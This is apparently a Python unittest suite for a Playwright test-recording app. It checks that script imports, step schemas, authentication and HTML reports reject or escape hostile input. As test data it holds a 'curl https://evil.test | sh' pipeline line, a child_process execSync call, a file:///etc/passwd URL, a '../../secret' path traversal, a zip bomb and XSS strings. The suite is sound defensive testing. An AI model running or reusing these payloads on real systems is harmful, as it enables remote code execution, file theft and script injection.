"""Static import, authoring, export, access and resource-policy regressions."""
import asyncio
import base64
import io
import json
import os
from pathlib import Path
import tempfile
import unittest
from unittest.mock import patch
import zipfile

from tests.bootstrap import ensure_test_env
ensure_test_env()
from fastapi.testclient import TestClient
from app.main import app
from app import library_store
from app.db import Recording, RecordingStep, Run, SessionLocal
from app.script_import import MAX_BYTES, parse_file, parse_bundle
from app.step_runtime import normalize_steps, normalize_step, interpolate, audit_selector


CSV = b'action,selector,value,label\nnavigate,,http://example.test,Open\nfill,#name,Ada,Name\nclick,#go,,Go\nassert_text,#out,"Hello, Ada",Check\n'
PYTHON = b'''from playwright.sync_api import expect\ndef test_greeting(page):\n    page.goto("http://example.test")\n    page.get_by_label("Name").fill("Ada")\n    page.get_by_role("button", name="Continue").click()\n    expect(page.locator("#out")).to_have_text("Hello, Ada")\n'''
JAVASCRIPT = b'''import { test, expect } from '@playwright/test';\ntest('greeting', async ({ page }) => {\n  await page.goto('http://example.test');\n  await page.getByRole('button', { name: 'Continue' }).click();\n  await expect(page.locator('#out')).toHaveText('Hello, Ada');\n});\n'''
BDD = b'''Feature: Greeting\nScenario: Say hello\n Given I open "http://example.test"\n When I fill "#name" with "Ada"\n And I click "#go"\n Then "#out" should equal "Hello, Ada"\n'''


class ImportTests(unittest.TestCase):
    def test_UT_IMP_01_csv_json_roundtrip(self):
        result = parse_file('test.csv', CSV)
        self.assertTrue(result['can_save'], result)
        self.assertEqual(len(result['steps']), 4)
        again = parse_file('steps.json', json.dumps(result['steps']).encode())
        self.assertTrue(again['can_save'])
        self.assertEqual(again['steps'], result['steps'])
        self.assertFalse(result['source_executed'])
        self.assertEqual(result['execution'], 'sequential')

    def test_UT_IMP_02_excel_and_formula_rejection(self):
        from openpyxl import Workbook
        book = Workbook(); sheet = book.active
        sheet.append(['action', 'selector', 'value']); sheet.append(['fill', '#x', 'literal'])
        buffer = io.BytesIO(); book.save(buffer)
        self.assertTrue(parse_file('test.xlsx', buffer.getvalue())['can_save'])
        sheet['C2'] = '=1+2'; buffer = io.BytesIO(); book.save(buffer)
        result = parse_file('test.xlsx', buffer.getvalue())
        self.assertFalse(result['can_save'])
        self.assertIn('formulas', result['diagnostics'][0]['message'])
        sheet['C2'] = 'literal'; book.create_sheet(); buffer = io.BytesIO(); book.save(buffer)
        self.assertFalse(parse_file('multi.xlsx', buffer.getvalue())['can_save'])

    def test_UT_IMP_03_python_static_subset(self):
        result = parse_file('test.py', PYTHON)
        self.assertTrue(result['can_save'], result)
        self.assertEqual(result['steps'][1]['selector']['kind'], 'label')
        self.assertEqual(result['steps'][2]['selector']['name'], 'Continue')
        self.assertEqual(result['steps'][-1]['action'], 'assert_text')

    def test_UT_IMP_04_no_python_execution_or_silent_branches(self):
        with tempfile.TemporaryDirectory() as directory:
            sentinel = Path(directory) / 'owned'
            data = f'import pathlib\npathlib.Path({str(sentinel)!r}).write_text("owned")\npage.click("#x")\n'.encode()
            result = parse_file('evil.py', data)
            self.assertFalse(result['can_save'])
            self.assertFalse(sentinel.exists())
        for code in [b'if True:\n page.click("#x")', b'for i in range(3):\n page.click("#x")', b'page.wait_for_timeout(5000)', b'page.evaluate("alert(1)")', b'page.click("#x", force=True)']:
            self.assertFalse(parse_file('a.py', code)['can_save'], code)

    def test_UT_IMP_05_javascript_typescript_subset(self):
        for ext in ['js', 'ts']:
            result = parse_file('test.' + ext, JAVASCRIPT)
            self.assertTrue(result['can_save'], result)
            self.assertEqual(len(result['steps']), 3)
        self.assertFalse(parse_file('evil.js', b"require('child_process').execSync('id');")['can_save'])
        self.assertFalse(parse_file('two.js', JAVASCRIPT + JAVASCRIPT)['can_save'])
        self.assertFalse(parse_file('option.js', b'await page.click("#x", { force: true });')['can_save'])

    def test_UT_IMP_06_bdd_cucumber_unknown_phrases(self):
        for ext in ['feature', 'bdd']:
            result = parse_file('flow.' + ext, BDD)
            self.assertTrue(result['can_save'], result)
            self.assertEqual(result['steps'][-1]['action'], 'assert_text')
        result = parse_file('custom.feature', BDD + b' And I magically approve all claims\n')
        self.assertFalse(result['can_save'])
        self.assertEqual(result['diagnostics'][0]['line'], 7)
        self.assertFalse(parse_file('outline.feature', b'Scenario Outline: data\n Given I open "<url>"\n')['can_save'])

    def test_UT_IMP_07_jenkins_reference_bundle(self):
        wrapper = b"pipeline { agent any stages { stage('test') { steps { sh 'pytest test_flow.py' } } } }"
        result = parse_bundle([('Jenkinsfile', wrapper), ('test_flow.py', PYTHON)])
        self.assertTrue(result['can_save'], result)
        self.assertEqual(result['wrapper'], 'Jenkinsfile')
        self.assertFalse(result['source_executed'])
        for bad in [wrapper.replace(b'pytest test_flow.py', b'curl https://evil.test | sh'), wrapper.replace(b'agent any', b'agent any post { always { sh "id" } }')]:
            with self.assertRaises(ValueError):
                parse_bundle([('Jenkinsfile', bad), ('test_flow.py', PYTHON)])
        with self.assertRaises(ValueError):
            parse_bundle([('Jenkinsfile', wrapper)])

    def test_UT_IMP_08_limits_and_unknown_formats(self):
        self.assertFalse(parse_file('big.csv', b'x' * (MAX_BYTES + 1))['can_save'])
        self.assertFalse(parse_file('legacy.xls', b'not an xlsx')['can_save'])
        self.assertFalse(parse_file('unknown.csv', b'action,selector,typo\nclick,#x,yes')['can_save'])
        self.assertFalse(parse_file('many.json', json.dumps([{'action':'click','selector':'#x'}] * 501).encode())['can_save'])
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, 'w', compression=zipfile.ZIP_DEFLATED) as z:
            z.writestr('xl/huge.xml', b'0' * (9 * 1024 * 1024))
        self.assertFalse(parse_file('bomb.xlsx', buf.getvalue())['can_save'])

    def test_UT_IMP_09_schema_fail_closed(self):
        invalid = [
            {'action':'click','selector':{'primary':'#x','force':True}},
            {'action':'navigate','value':'file:///etc/passwd'},
            {'action':'navigate','value':'https://user:pass@example.test'},
            {'action':'assert_count','value':'nan','selector':'#x'},
            {'action':'fill','value':'x','selector':'#x','repeat_count':1000},
            {'action':'upload_file','selector':{'primary':'#file','filename':'../../secret','base64':'YQ=='}},
            {'action':'click','selector':{'primary':'#x','timeout_ms':900000}},
            {'action':'api_request','value':'https://example.test','selector':{'method':'CONNECT'}},
        ]
        for step in invalid:
            with self.subTest(step=step), self.assertRaises(ValueError):
                normalize_step(step)
        self.assertEqual(interpolate('{{n}}', {'n': 0}), '0')
        with self.assertRaisesRegex(ValueError, 'Missing variable'):
            interpolate('{{unknown}}', {})

    def test_UT_IMP_10_preview_no_publication_and_save_once(self):
        project = library_store.create_project('Import target', '')
        with TestClient(app) as client, patch.object(library_store, '_finish', return_value=False) as publish:
            result = client.post('/api/imports/preview?filename=flow.csv', content=CSV)
            self.assertEqual(result.status_code, 200, result.text)
            preview = result.json()
            publish.assert_not_called()
            # This unit isolates export/publication from browser execution. The
            # real receipt binding and actual browser gate have separate coverage.
            with patch('app.import_drafts.verified', return_value=({'id':'test-receipt'}, {'steps':preview['steps']})), patch('app.import_drafts.write'):
                response = client.post('/api/imports/save', json={'project_id': project['id'], 'name':'Imported', 'steps':preview['steps'], 'draft_id':'test-receipt'})
            self.assertEqual(response.status_code, 201, response.text)
            self.assertEqual(publish.call_count, 1)
            saved = response.json()
            self.assertEqual(saved['step_count'], 4)
            self.assertIn('publish_message', saved)
            detail = client.get('/api/recordings/' + saved['id']).json()
            self.assertEqual(detail['steps'][-1]['action'], 'assert_text')
            self.assertIn('recording.spec.ts', detail['resources'])
            self.assertIn('testforge_runtime.py', detail['resources'])
            archive = client.get('/api/recordings/' + saved['id'] + '/resources.zip')
            self.assertEqual(archive.status_code, 200)
            with zipfile.ZipFile(io.BytesIO(archive.content)) as z:
                self.assertIn('steps.json', z.namelist())
                self.assertIn('playwright.config.ts', z.namelist())

    def test_UT_IMP_11_invalid_save_is_atomic_and_oversize_is_rejected(self):
        project = library_store.create_project('Rejected imports', '')
        before = library_store.list_recordings(project['id'])
        with TestClient(app) as client:
            response = client.post('/api/imports/save', json={'project_id':project['id'], 'name':'bad', 'steps':[{'action':'shell','value':'id'}]})
            self.assertEqual(response.status_code, 422)
            self.assertEqual(library_store.list_recordings(project['id']), before)
            response = client.post('/api/imports/preview?filename=big.csv', content=b'x'*(MAX_BYTES+1))
            self.assertEqual(response.status_code, 413)
            response = client.post('/api/imports/preview-bundle', json={'files':[{'name':'x','base64':'not_base64!'}]})
            self.assertEqual(response.status_code, 422)

    def test_UT_IMP_12_add_and_edit_assertion(self):
        project = library_store.create_project('Author actions', '')
        rec = library_store.create_recording(project['id'], 'Assertions', '')
        with TestClient(app) as client:
            response = client.post(f"/api/recordings/{rec['id']}/steps", json={'action':'assert_visible','selector':'#x'})
            self.assertEqual(response.status_code, 201, response.text)
            steps = client.get(f"/api/recordings/{rec['id']}").json()['steps']
            response = client.patch(f"/api/recordings/{rec['id']}/steps/{steps[0]['id']}", json={'action':'assert_text','value':'Ready'})
            self.assertEqual(response.status_code, 200, response.text)
            response = client.patch(f"/api/recordings/{rec['id']}/steps/{steps[0]['id']}", json={'selector':{'primary':'#x','force':True}})
            self.assertEqual(response.status_code, 422)

    def test_UT_IMP_13_access_gate_http_and_websocket(self):
        with patch.dict(os.environ, {'TF_ACCESS_TOKEN':'a'*40}), TestClient(app) as client:
            self.assertEqual(client.get('/api/projects').status_code, 401)
            self.assertEqual(client.get('/api/auth/status').json()['mode'], 'single-operator')
            self.assertEqual(client.post('/api/auth/login', json={'token':'wrong'}).status_code, 401)
            self.assertEqual(client.post('/api/auth/login', json={'token':'a'*40}).status_code, 200)
            self.assertTrue(client.get('/api/auth/status').json()['authenticated'])
            self.assertEqual(client.get('/api/projects').status_code, 200)
            self.assertIn('httponly', client.post('/api/auth/login',json={'token':'a'*40}).headers['set-cookie'].lower())
            self.assertEqual(client.post('/api/auth/logout').status_code, 200)
            self.assertEqual(client.get('/api/projects').status_code, 401)
            from starlette.websockets import WebSocketDisconnect
            with self.assertRaises(WebSocketDisconnect):
                with client.websocket_connect('/ws/runs/anything'):
                    pass
            self.assertEqual(client.get('/api/projects',headers={'Authorization':'Bearer '+'a'*40}).status_code,200)
        with patch.dict(os.environ, {'TF_ACCESS_TOKEN':'short'}), TestClient(app) as client:
            self.assertEqual(client.get('/api/projects').status_code, 401)

    def test_UT_IMP_14_portable_reports_escape_target_content(self):
        with SessionLocal() as db:
            row = Run(recording_id='report-only',status='failed',execution_log=[{'order':1,'action':'assert_text','label':'<script>alert(1)</script>','status':'failed','error':'<img onerror=evil>'}])
            db.add(row); db.commit(); rid = row.id
        with TestClient(app) as client:
            response = client.get(f'/api/runs/{rid}/report.html')
            self.assertEqual(response.status_code,200)
            self.assertNotIn('<script>',response.text)
            self.assertIn('&lt;script&gt;',response.text)
            self.assertIn("default-src 'none'",response.headers['content-security-policy'])
            self.assertEqual(client.get(f'/api/runs/{rid}/report.json').json()['status'],'failed')
            self.assertEqual(client.get('/api/runs/unknown/report.html').status_code,404)

    def test_UT_IMP_15_recording_autosave_skips_expensive_exports(self):
        project = library_store.create_project('Cheap autosaves', '')
        rec = library_store.create_recording(project['id'], 'Cheap', '')
        with patch('app.export_formats.write_exports') as exports:
            library_store.export_recording(rec['id'], publish=False, include_exports=False)
            exports.assert_not_called()
            library_store.export_recording(rec['id'], publish=True, include_exports=False)
            exports.assert_called_once()

    def test_UT_IMP_16_sensitive_options_not_duplicated_in_audit(self):
        actual = audit_selector({'primary':'#file','base64':'secret','headers':{'Authorization':'secret'},'body':'secret'})
        self.assertNotIn('secret',json.dumps(actual))
        self.assertEqual(actual['primary'],'#file')

    def test_UT_IMP_17_missing_variable_fails_before_typing(self):
        from app.executor import replay_step
        from tests.fakes import FakePage
        page=FakePage()
        with self.assertRaisesRegex(ValueError,'Missing variable'):
            asyncio.run(replay_step(page,{'action':'type','value':'{{missing}}'},{}))
        self.assertFalse(page.typed)

    def test_UT_IMP_18_resource_policy_defaults(self):
        from app.executor import DEFAULT_BUDGETS
        self.assertEqual(DEFAULT_BUDGETS['type_delay_ms'],0)
        root=Path(__file__).resolve().parents[1]
        html=(root/'app/static/index.html').read_text()
        self.assertNotIn('cdn.tailwindcss.com',html)
        self.assertNotIn('unpkg.com',html)
        self.assertIn('localStorage.getItem("tf_live_window") === "1"',html)
        config=(root/'app/export_templates.py').read_text()
        self.assertIn('workers: 1',config)
        self.assertIn('fullyParallel: false',config)

    def test_UT_IMP_19_tags_parent_tree_and_filters(self):
        from app.main import _select_batch_recordings
        project=library_store.create_project('Tagging', '')
        parent=library_store.create_recording(project['id'],'Parent','')
        child=library_store.create_recording(project['id'],'Child','')
        with TestClient(app) as client:
            response=client.patch(f"/api/recordings/{child['id']}/metadata",json={'tags':'Smoke, Checkout','parent_id':parent['id']})
            self.assertEqual(response.status_code,200,response.text)
            self.assertEqual(response.json()['tags'],'checkout,smoke')
            rows=client.get(f"/api/projects/{project['id']}/recordings").json()
            match=next(r for r in rows if r['id']==child['id'])
            self.assertEqual(match['parent_id'],parent['id'])
            self.assertEqual(match['tags'],'checkout,smoke')
            selected,_=_select_batch_recordings({'project_id':project['id'],'include_tags':['smoke']})
            self.assertEqual([r['id'] for r in selected],[child['id']])
            selected,_=_select_batch_recordings({'project_id':project['id'],'include_tags':['smoke'],'exclude_tags':['checkout']})
            self.assertEqual(selected,[])
            response=client.patch(f"/api/recordings/{parent['id']}/metadata",json={'parent_id':child['id']})
            self.assertEqual(response.status_code,422)
            self.assertIsNone(library_store.get_recording(parent['id'])['parent_id'])

    def test_UT_IMP_20_live_recording_reads_current_steps_without_export(self):
        from app import recorder
        project=library_store.create_project('Live view', '')
        rec=library_store.create_recording(project['id'],'Live','')
        with SessionLocal() as db:
            db.add(RecordingStep(recording_id=rec['id'],order=1,action='press',value='Enter'))
            db.commit()
        session=object()
        with patch.dict(recorder.SESSIONS,{rec['id']:session}), TestClient(app) as client:
            result=client.get(f"/api/recordings/{rec['id']}").json()
            self.assertEqual(result['source'],'live')
            self.assertEqual(result['steps'][0]['action'],'press')
            self.assertTrue(result['exports_pending'])
        self.assertEqual(library_store.get_recording(rec['id'])['steps'],[])

    def test_UT_IMP_21_schema_version_and_literal_js_option(self):
        step=normalize_step({'action':'click','selector':'#x'})
        self.assertEqual(step['selector']['schema_version'],1)
        with self.assertRaisesRegex(ValueError,'schema_version'):
            normalize_step({'action':'click','selector':{'primary':'#x','schema_version':2}})
        result=parse_file('a.js',b"await page.getByRole('button', { name: 'true value' }).click();")
        self.assertTrue(result['can_save'],result)
        self.assertEqual(result['steps'][0]['selector']['name'],'true value')

    def test_UT_IMP_22_websocket_disconnect_releases_idle_sender(self):
        from app.main import _forward_events
        class Disconnected:
            async def receive(self): return {'type':'websocket.disconnect'}
            async def send_json(self, event): pass
        async def exercise():
            await asyncio.wait_for(_forward_events(Disconnected(),asyncio.Queue()),1)
            self.assertEqual(len(asyncio.all_tasks()),1)
        asyncio.run(exercise())

    def test_UT_IMP_23_subscriber_queues_and_counts_are_bounded(self):
        from app.main import RUN_STREAMS,_subscribe_events,broadcast_run
        key='bounded-test'
        async def exercise():
            try:
                queue=_subscribe_events(key)
                for _ in range(3): self.assertIsNotNone(_subscribe_events(key))
                self.assertIsNone(_subscribe_events(key))
                for i in range(100): await broadcast_run(key,{'type':'step','order':i})
                await broadcast_run(key,{'type':'done'})
                self.assertLessEqual(queue.qsize(),8)
                events=[]
                while not queue.empty(): events.append(queue.get_nowait())
                self.assertEqual(events[-1]['type'],'done')
            finally:
                RUN_STREAMS.pop(key,None)
        asyncio.run(exercise())


if __name__ == '__main__':
    unittest.main(verbosity=2)
